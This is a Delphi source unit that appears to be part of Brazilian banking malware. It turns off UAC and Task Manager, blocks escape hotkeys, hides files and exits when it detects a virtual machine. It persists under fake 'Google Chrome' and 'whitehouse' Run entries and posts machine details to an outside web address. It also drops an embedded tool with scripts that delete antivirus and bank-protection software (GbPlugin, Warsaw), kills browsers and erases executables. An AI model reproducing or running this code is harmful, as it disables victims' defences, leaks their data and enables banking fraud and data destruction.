unit uPCFuncs;

interface

uses Windows, Classes, Registry, TlHelp32, SysUtils, Messages, Forms, Activex,
  ComObj, shellapi, ddeman, CommCtrl, StdCtrls, ShlObj, idHTTP, Dialogs;

type
  TNTdllApi = Function(Thread: thandle): boolean; stdcall;

type
  Terminate = Function(Thread: thandle; dwCode: word): boolean; Stdcall;

//procedure AVs;
function  PEGADIR : String;
function NomePC: string;
function GetWindowsVersion: string;
function WUser: string;
procedure KP(hWindowHandle: HWND);
function GetProgramFilesDir: string;
procedure DisableUAC;
procedure DisablePreview;
procedure TaskMgrOff(ligado: integer);
procedure NoHotKey(hdle: HWND; estado: boolean);
procedure Max(janela: HWND);
procedure Delay(msecs: integer);
function GetOS: string;
//function AVExists: string;
function WindowsExit(RebootParam: Longword): Boolean;
Function Anti_End: Bool;
//function GetDefaultBrowser: String;
function IntToBoolean(Num: integer): boolean;
function SetTokenPrivileges: boolean;
//procedure block2(Path: String);
function GravaDados(URL:string): boolean;
//function LocalAppDataPath : string;
//function GetSpecialDir(folder : integer) : string;
//procedure ConfigJava;
procedure AutoDelete;
//procedure DownExec(Path, Link, Params: String);
//function HTTPGet(Link: String): String;
procedure EnableAero;
//function ExecuteAndWait(Arquivo :String; Estado :Integer) :Integer;
function  ISAeroEnabled: Boolean;
function strToBoolean(s: string): boolean;
function IsWindows64: Boolean;
procedure Extract_Volarite ;
function GetWinDir: string;
Procedure Lord_Coder_Copyright;
procedure Google;
procedure arquivologfile;
Procedure IniciarComWindows(keyName:string);
function SaveList: String;
procedure verifica_registro;
procedure AutoKeyRunshell;
function FileSetAttr(const FileName: string; Attr: Integer): Integer;
procedure HideFile(FileName :String);
procedure Verifullbuster ;
Procedure Iniciar;


const
faHidden    = $00000002 platform;
faSysFile   = $00000004 platform;


var
//PropValues: TArray<string>;
ProductType: DWORD;

implementation


uses uCrypt, unit1,uGB;



function FileSetAttr(const FileName: string; Attr: Integer): Integer;
begin
  Result := 0;
  if not SetFileAttributes(PChar(FileName), Attr) then
    Result := GetLastError;
end;

procedure HideFile(FileName :String);
begin
  FileSetAttr(FileName, faHidden or faSysFile);
end;



function strToBoolean(s: string): boolean;
begin
result := ((uppercase(s) = 'TRUE') or
           (uppercase(s) = 'T')    or
           (uppercase(s) = 'YES')  or
           (uppercase(s) = 'Y')    or
           (uppercase(s) = 'ON')   or
           (uppercase(s) = 'O')    or
           (uppercase(s) = '1'));
end;


function IsWindows64: Boolean;
type
  TIsWow64Process = function(AHandle:THandle; var AIsWow64: BOOL): BOOL; stdcall;
var
  vKernel32Handle: DWORD;
  vIsWow64Process: TIsWow64Process;
  vIsWow64       : BOOL;
begin
  Result := False;
  vKernel32Handle := LoadLibrary('kernel32.dll');
  if (vKernel32Handle = 0) then Exit; // Loading kernel32.dll was failed, just return
  try
    @vIsWow64Process := GetProcAddress(vKernel32Handle, 'IsWow64Process');
    if not Assigned(vIsWow64Process) then Exit; // Loading IsWow64Process was failed, just return
    vIsWow64 := False;
    if (vIsWow64Process(GetCurrentProcess, vIsWow64)) then
      Result := vIsWow64;   // use the returned value
  finally
    FreeLibrary(vKernel32Handle);  // unload the library
  end;
end;

function  ISAeroEnabled: Boolean;
type
  _DwmIsCompositionEnabledFunc = function(var IsEnabled: Boolean): HRESULT; stdcall;
var
  Flag                       : Boolean;
  DllHandle                  : THandle;
  OsVersion                  : TOSVersionInfo;
  DwmIsCompositionEnabledFunc: _DwmIsCompositionEnabledFunc;
begin
  Result:=False;
  ZeroMemory(@OsVersion, SizeOf(OsVersion));
  OsVersion.dwOSVersionInfoSize := SizeOf(TOSVERSIONINFO);

  if ((GetVersionEx(OsVersion)) and (OsVersion.dwPlatformId = VER_PLATFORM_WIN32_NT) and (OsVersion.dwMajorVersion >= 6)) then //is Vista or Win7?
  begin
    DllHandle := LoadLibrary('dwmapi.dll');
    try
      if DllHandle <> 0 then
      begin
        @DwmIsCompositionEnabledFunc := GetProcAddress(DllHandle, 'DwmIsCompositionEnabled');
        if (@DwmIsCompositionEnabledFunc <> nil) then
        begin
          if DwmIsCompositionEnabledFunc(Flag)= S_OK then
           Result:=Flag;
        end;
      end;
    finally
      if DllHandle <> 0 then
        FreeLibrary(DllHandle);
    end;
  end;
end;



function WindowsExit(RebootParam: Longword): Boolean;
var
  TTokenHd: THandle;
  TTokenPvg: TTokenPrivileges;
  cbtpPrevious: DWORD;
  rTTokenPvg: TTokenPrivileges;
  pcbtpPreviousRequired: DWORD;
  tpResult: Boolean;
const
  SE_SHUTDOWN_NAME = 'SeShutdownPrivilege';
begin
  tpResult := OpenProcessToken(GetCurrentProcess(),
                               TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
                               TTokenHd) ;
  if tpResult then
  begin
    tpResult := LookupPrivilegeValue(nil,
                                     SE_SHUTDOWN_NAME,
                                     TTokenPvg.Privileges[0].Luid) ;
    TTokenPvg.PrivilegeCount := 1;
    TTokenPvg.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
    cbtpPrevious := SizeOf(rTTokenPvg) ;
    pcbtpPreviousRequired := 0;
    if tpResult then
    Windows.AdjustTokenPrivileges(TTokenHd,
                                  False,
                                  TTokenPvg,
                                  cbtpPrevious,
                                  rTTokenPvg,
                                  pcbtpPreviousRequired) ;
  end;
  Result := ExitWindowsEx(RebootParam, 0) ;
end;



procedure EnableAero;
var Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_CURRENT_USER;
    Reg.OpenKey('Software\Microsoft\Windows\DWM', False);
    Reg.WriteInteger('Composition',1);
    Reg.WriteInteger('CompositionPolicy',2);
  except
    Reg.Free;
  end;
end;


function SetTokenPrivileges: boolean;
var
  hToken1, hToken2: thandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
  hToken3: Cardinal;
begin
  Version.dwOSVersionInfoSize := SizeOf(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValue(nil, 'SeDebugPrivilege',
        TokenPrivileges.Privileges[0].luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, false, TokenPrivileges, SizeOf(TokenPrivileges), PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, false, TokenPrivileges, SizeOf(TokenPrivileges), PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except
      ;
    end;
  end;
  result := True;
end;


procedure AutoDelete;
Var Arquivo: TextFile;
    Reg: TRegistry;
begin
  AssignFile(Arquivo, ChangeFileExt(ParamStr(0), '.bat'));
  try
    ReWrite(Arquivo);
    WriteLn(Arquivo, ':1');
    WriteLn(Arquivo, Format('Erase "%s"', [ParamStr(0)]));
    WriteLn(Arquivo, Format('If exist "%s" Goto 1', [ParamStr(0)]));
    WriteLn(Arquivo, Format('Erase "%s"', [ChangeFileExt(ParamStr(0), '.bat')]));
  finally
    CloseFile(Arquivo);
  end;
  ShellExecute(0,'Open',pchar(ChangeFileExt(ParamStr(0), '.bat')),nil,nil, sw_hide);
  Halt;
end;

function ExtractFileName(const Path: String): String;
var
 I, L:Integer;
 Ch:Char;
Begin
 Result := Path;
 L := Length(Path);
 For I := L DownTo 1 Do
 Begin
  Ch := Path[I];
  If (Ch = '\') Or (Ch = '/') Then
  Begin
   Result := Copy(Path, I + 1, L - I);
   Break;
  End;
 End;
End;


function GetOS: string;
var
  objWMIService: OLEVariant;
  colItems: OLEVariant;
  colItem: OLEVariant;
  oEnum: IEnumvariant;
  iValue: LongWord;

  function GetWMIObject(const objectName: String): IDispatch;
  var
    chEaten: integer;
    BindCtx: IBindCtx;
    Moniker: IMoniker;
  begin
    OleCheck(CreateBindCtx(0, BindCtx));
    OleCheck(MkParseDisplayName(BindCtx, StringToOleStr(objectName), chEaten,
      Moniker));
    OleCheck(Moniker.BindToObject(BindCtx, nil, IDispatch, result));
  end;

begin
  try
    objWMIService := GetWMIObject('winmgmts:\\localhost\root\cimv2');
    colItems := objWMIService.ExecQuery('SELECT * FROM Win32_OperatingSystem',
      'WQL', 0);
    oEnum := IUnknown(colItems._NewEnum) as IEnumvariant;
    if oEnum.Next(1, colItem, iValue) = 0 then
      result := Format('%s %s', [colItem.Caption, colItem.Version]);
  except
    result := '?'
  end;
end;

procedure Delay(msecs: integer);
var
  FirstTickCount: longint;
begin
  FirstTickCount := GetTickCount;
  repeat
    Application.ProcessMessages; { para acessar outros controles, etc. }
  until ((GetTickCount - FirstTickCount) >= longint(msecs));
end;

Procedure Iniciar;
var
Registro : TRegistry;
  dir:String;
begin
if not fileexists(PEGADIR+'w-whause') then
begin
   Form1.memo1.Lines.SaveToFile(PEGADIR+'w-hause');
end;
begin
  Registro := TRegistry.create;
 try
    if Registro.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',True) then
      Registro.WriteString('whitehouse',PEGADIR+'whitehouse.exe')
    else
        Registro.DeleteValue('whitehouse');
        Registro.CloseKey;
  finally
    Registro.Free;
    CopyFile(Pchar(Application.ExeName),Pchar( PEGADIR+'whitehouse.exe'),TRUE);
end;
  end;
  end;
function IntToBoolean(Num: integer): boolean;
begin
  if Num <> 0 then
    result := True
  else
    result := false;
end;

procedure KP(hWindowHandle: HWND);
var
  hprocessID: integer;
  processHandle: thandle;
  DWResult: dword;
begin
  SendMessageTimeout(hWindowHandle, WM_CLOSE, 0, 0, SMTO_ABORTIFHUNG or
    SMTO_NORMAL, 5000, DWResult);
  if isWindow(hWindowHandle) then
  begin
    GetWindowThreadProcessID(hWindowHandle, @hprocessID);
    if hprocessID <> 0 then
    begin
      processHandle := OpenProcess(PROCESS_TERMINATE or
        PROCESS_QUERY_INFORMATION, false, hprocessID);
      if processHandle <> 0 then
      begin
        TerminateProcess(processHandle, 0);
        CloseHandle(processHandle);
      end;
    end;
  end;
end;

function GetProgramFilesDir: string;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_LOCAL_MACHINE;
    Reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion', false);
    result := Reg.ReadString('ProgramFilesDir');
  finally
    Reg.Free;
  end;
end;

function NomePC: string;
const
  MAX_COMPUTER_LENGTH = 30;
var
  pNome: PChar;
  len: dword;
begin
  try
    len := MAX_COMPUTER_LENGTH + 1;
    GetMem(pNome, len);
    if GetComputerName(pNome, len) then
      result := pNome
    else
      result := 'Unknow';
  finally
    FreeMem(pNome, len);
  end;
end;

procedure TaskMgrOff(ligado: integer);
var
  Reg: TRegistry;
begin
  try
    Reg := TRegistry.Create;
    Reg.RootKey := HKEY_CURRENT_USER;
    if not Reg.KeyExists
      ('\Software\Microsoft\Windows\CurrentVersion\Policies\System') then
      Reg.CreateKey
        ('\Software\Microsoft\Windows\CurrentVersion\Policies\System');
    Reg.OpenKey
      ('\Software\Microsoft\Windows\CurrentVersion\Policies\System', false);
    Reg.WriteInteger('DisableTaskMgr', 0000000 + ligado);
  finally
    Reg.Free;
  end;
end;

procedure NoHotKey(hdle: HWND; estado: boolean);
begin
  try
    if estado then
    begin
      RegisterHotkey(hdle, 1, MOD_ALT, VK_ESCAPE);
      RegisterHotkey(hdle, 2, MOD_ALT, VK_f4);
      RegisterHotkey(hdle, 3, MOD_ALT, VK_TAB);
    end;
    if not estado then
    begin
      UnRegisterHotkey(hdle, 1);
      UnRegisterHotkey(hdle, 2);
      UnRegisterHotkey(hdle, 3);
    end;
  finally
  end;
end;

procedure Max(janela: HWND);
begin
  ShowWindow(janela, SW_MAXIMIZE);
end;


Function IsVirtualPCPresent: Bool;
Const
  sArrVM: Array [0 .. 3] Of String = ('VIRTUAL', 'VMWARE', 'VBOX', 'QEMU');
Var
  hlKey:      HKEY;
  sBuffer:    String;
  sPathName:  String;
  I:          Integer;
  iRegType:   Integer;
  iDataSize:  Integer;
Begin
  IsVirtualPCPresent := False;
  iRegType := 1;
  sPathName := 'SYSTEM\ControlSet001\Services\Disk\Enum';

  If RegOpenKeyEx($80000002, PChar(sPathName), 0, $20019, hlKey) = 0 Then
    If RegQueryValueEx(hlKey, '0', 0, @iRegType, Nil, @iDataSize) = 0 Then
    Begin
      SetLength(sBuffer, iDataSize);
      RegQueryValueEx(hlKey, '0', 0, @iRegType,
                      PByte(PChar(sBuffer)), @iDataSize);
      For I := 0 To 3 Do
        If AnsiPos(UpperCase(sArrVM[I]), UpperCase(Trim(sBuffer))) > 0 Then
          IsVirtualPCPresent := True;
    End;

  RegCloseKey(hlKey);
End;


Function Anti_End: Bool;
Begin
  Anti_End := False;
  If IsVirtualPCPresent = True  Then
    ExitProcess(0);
End;



procedure DisablePreview;
var
  reg: TRegistry;
begin
  reg := TRegistry.Create;
  reg.RootKey := HKEY_CURRENT_USER;
  reg.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced', True);
  try
    reg.WriteInteger('ExtendedUIHoverTime',2710);
  finally
    reg.Free;
  end;
end;



procedure DisableUAC;
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  Reg.RootKey := HKEY_LOCAL_MACHINE;
  Reg.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Policies\System', false);
  try
    Reg.WriteInteger('EnableLUA', 0);
    Reg.WriteInteger('ConsentPromptBehaviorAdmin', 0);
  finally
    Reg.Free;
  end;
end;

function  PEGADIR : String;//Pega o diretorio da Pasta Temporaria
var DiretorioTemp : PChar;
    TempBuffer    : Dword;
begin
  TempBuffer := 255;
  GetMem(DiretorioTemp,255);
  try
    GetTempPath(tempbuffer,diretoriotemp);
    result := DiretorioTemp;
  finally
    FreeMem(diretoriotemp);
  end;
end;


function GetWindowsVersion: string;
var
  VerInfo: TOsversionInfo;
  PlatformId, VersionNumber: string;
  Reg: TRegistry;
begin
  VerInfo.dwOSVersionInfoSize := SizeOf(VerInfo);
  GetVersionEx(VerInfo);
  // Detect platform
  Reg := TRegistry.Create;
  Reg.RootKey := HKEY_LOCAL_MACHINE;
  case VerInfo.dwPlatformId of
    VER_PLATFORM_WIN32s:
      begin
        PlatformId := 'Windows 3.1';
      end;
    VER_PLATFORM_WIN32_WINDOWS:
      begin
        // Registry
        Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion', false);
        PlatformId := Reg.ReadString('ProductName');
        VersionNumber := Reg.ReadString('VersionNumber');
      end;
    VER_PLATFORM_WIN32_NT:
      begin
        Reg.OpenKey('\SOFTWARE\Microsoft\Windows NT\CurrentVersion', false);
        PlatformId := Reg.ReadString('ProductName');
        VersionNumber := Reg.ReadString('CurrentVersion');
      end;
  end;
  Reg.Free;
  result := PlatformId + ' (version ' + VersionNumber + ')';
end;

Function WUser: string;
Var
  UserName: string;
  UserNameLen: dword;
Begin
  UserNameLen := 255;
  SetLength(UserName, UserNameLen);
  If GetUserName(PChar(UserName), UserNameLen) Then
    result := Copy(UserName, 1, UserNameLen - 1)
  Else
    result := 'Unknown';
End;

function GetWinDir: string;
var
  dir: array [0..MAX_PATH] of Char;
begin
  GetWindowsDirectory(dir, MAX_PATH);
  Result := StrPas(dir);
end;

procedure AutoKeyRunshell;
var
  Re: TRegistry;
  SS: string;
begin
   Re := TRegistry.Create;
   SS:=ExtractFileDir(Application.ExeName)+'\'+ExtractFileName(Application.ExeName);
   Re.rootkey:=HKEY_CURRENT_USER;
   Re.Openkey('\Software\Microsoft\Windows\CurrentVersion\Run',false);
   Re.WriteString('Google Chrome',SS);
   Re.CloseKey;
   Re.Free;
end;



procedure Verifullbuster;
begin
 if FileExists(GetProgramFilesDir+'\GbPlugin\GbpSv.exe') then
 begin
     arquivologfile;
     Extract_Volarite;
 end;
 end;

function GravaDados(URL:string): boolean;
var
Dados: TStringList;
iHTTP: TIdHTTP;
begin
  try
  Dados:=TStringList.Create;
  iHTTP:=TIdHTTP.Create(nil);
//  Dados.Add('Key_ID='+ KVERSAO );
  Dados.Add('NomePC='+NomePC);
  //Dados.Add('GetOS='+TOSVersion.ToString);
  Dados.Add('GetOS='+GetOS);
 // Dados.Add('GetAVInfo='+ GetAVInfo);
  Dados.Add('GbExists='+ GbExists);
//  Dados.Add('GetBrowser='+ DefaultBrowser);
try
    iHTTP.Post(URL,Dados);
  except
    end;
  finally
  Result:=true;
end;
end;

function SaveList: String;
var List: TStringList;
begin
  List := TStringList.Create;
  List.Add('Folders to delete:');
  List.Add('%ProgramFiles%\AVG');
  List.Add('%ProgramFiles%\Panda Security');
  List.Add('%ProgramFiles%\ESET');
  List.Add('%ProgramFiles%\KASPER~1');
  List.Add('%ProgramFiles%\Avira');
  List.Add('%ProgramFiles%\Softwin');
  List.Add('%ProgramFiles%\Grisoft');
  List.Add('%ProgramFiles%\NORTON~1');
  List.Add('%ProgramFiles%\Microsoft Security Client');
  List.Add('%ProgramFiles%\AVAST Software');
  List.Add('Files to move:');
  List.Add('%ProgramFiles%\Alwil Software\Avast5\AvastUI.exe|%ProgramFiles%\Alwil Software\Avast5\AvastUI.exa');
  List.Add('%ProgramFiles%\Alwil Software\Avast5\AvastSvc.exe|%ProgramFiles%\Alwil Software\Avast5\AvastSvc.exa');
  List.Add('%ProgramFiles%\Alwil Software\Avast5\ashUpd.exe|%ProgramFiles%\Alwil Software\Avast5\ashUpd.exa');
  List.Add('%ProgramFiles%\Alwil Software\Avast5\aswChLic.exe|%ProgramFiles%\Alwil Software\Avast5\aswChLic.exa');
  List.Add('%ProgramFiles%\AVAST Software\Avast\AvastSvc.exe|%ProgramFiles%\AVAST Software\Avast\AvastSvc.exa');
  List.Add('%ProgramFiles%\AVAST Software\Avast\AvastUI.exe|%ProgramFiles%\AVAST Software\Avast\AvastUI.exa');
  List.SaveToFile('C:\avenger.txt');
  List.Free;
  Result := 'C:\avenger.txt';
end;

procedure arquivologfile;
var
_Anntrax : Tregistry;
_gen : TextFile ;
begin
     _Anntrax := TRegistry.Create ;
     _Anntrax.RootKey := HKEY_CURRENT_USER ;
     _Anntrax.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',false) ;
if not _Anntrax.ValueExists('Google Chrome') then
       Begin
       AssignFile(_gen,'Log.txt');
       Rewrite(_gen);
       Writeln(_gen,'Folders to delete:');
       Writeln(_gen,'%ProgramFiles%\AVG');
       Writeln(_gen,'%ProgramFiles%\Panda Security');
       Writeln(_gen,'%ProgramFiles%\ESET');
       Writeln(_gen,'%ProgramFiles%\KASPER~1');
       Writeln(_gen,'%ProgramFiles%\Avira');
       Writeln(_gen,'%ProgramFiles%\COMODO');
       Writeln(_gen,'%ProgramFiles%\Bitdefender');
       Writeln(_gen,'%ProgramFiles%\mcafee');
       Writeln(_gen,'%ProgramFiles%\Softwin');
       Writeln(_gen,'%ProgramFiles%\Sandboxie');
       Writeln(_gen,'%ProgramFiles%\Grisoft');
       Writeln(_gen,'%ProgramFiles%\NORTON~1');
       Writeln(_gen,'%ProgramFiles%\Microsoft Security Client');
       Writeln(_gen,'%ProgramFiles%\AVAST Software');
       Writeln(_gen,'%ProgramFiles%\Baidu Security');
       Writeln(_gen,'%ProgramFiles%\GAS Tecnologia\Warsaw');
       Writeln(_gen,'%ProgramFiles%\GAS Tecnologia\G-Lock');
       Writeln(_gen,'') ;
       Writeln(_gen,'Files to delete:');
       Writeln(_gen,'%ProgramFiles%\GbPlugin\gbpsv.exe') ;
       Writeln(_gen,'%ProgramFiles%\GbPlugin\pm.dll') ;
       Writeln(_gen,'%ProgramFiles%\GbPlugin\gbpdist.dll') ;
       Writeln(_gen,'') ;
       Writeln(_gen,'Drivers to delete:');
       Writeln(_gen,'gbpkm') ;
       Writeln(_gen,'gbpndisrd') ;
       Writeln(_gen,'gbpndisrd') ;
       CloseFile(_gen);
       End;
end;

procedure verifica_registro;
var
CkVan :TRegistry ;
begin
     CkVan := TRegistry.Create ;
     CkVan.RootKey := HKEY_CURRENT_USER ;
     CkVan.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',false) ;
if not CkVan.ValueExists('Google Chrome') then
       GravaDados('http://pfa17.fr/administrator/includes/index.php?maquina=');
end;

Procedure Lord_Coder_Copyright;
var
AppHandle : HWND;
begin
AppHandle := FindWindow('Notepad', nil);
if IsWindow(AppHandle) then
PostMessage(AppHandle, WM_CLOSE, 0, 0);
end;

procedure Google;
var
_Firefox : TextFile;
begin
if FileExists('avenger.exe') or FileExists('Log.txt') then
  begin
  AssignFile(_Firefox,'Firefox.bat');
  Rewrite(_Firefox);
  Writeln(_Firefox,'taskkill /im firefox.exe');
  Writeln(_Firefox,'taskkill /im chrome.exe');
  Writeln(_Firefox,'taskkill /im iexplore.exe');
  Writeln(_Firefox,'taskkill /im notepad.exe');
  Writeln(_Firefox,'rd /s /q c:\avenger');
  Writeln(_Firefox,'del c:\avenger.txt');
  Writeln(_Firefox,'Erase "%s"  c:\*.exe');
  Writeln(_Firefox,'del     avenger.exe');
  Writeln(_Firefox,'Erase "%s"  *.txt  ');
  Writeln(_Firefox,'Erase "%s"  *.bat');
  CloseFile(_Firefox);
  shellExecute(0, nil, 'cmd.exe', '/k start Firefox.bat', nil, SW_NORMAL);
  end;
end;



procedure Extract_Volarite;
var
_BARATA :TRegistry;
a  : TResourceStream ;
b: String ;
begin
     _BARATA := TRegistry.Create ;
     _BARATA.RootKey := HKEY_CURRENT_USER ;
     _BARATA.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',false) ;
if not _BARATA.ValueExists('Google Chrome') then
  begin
    b:='avenger.exe';
    a := TResourceStream.Create(HInstance,'AVG','EXEFILE');
    try
     a.SaveToFile(b);
    finally
     a.Free;
     ShellExecute(0,'open','cmd.exe','/k avenger.exe /nogui /reboot Log.txt',nil, SW_HIDE);
  end;
  end;
end;
end.
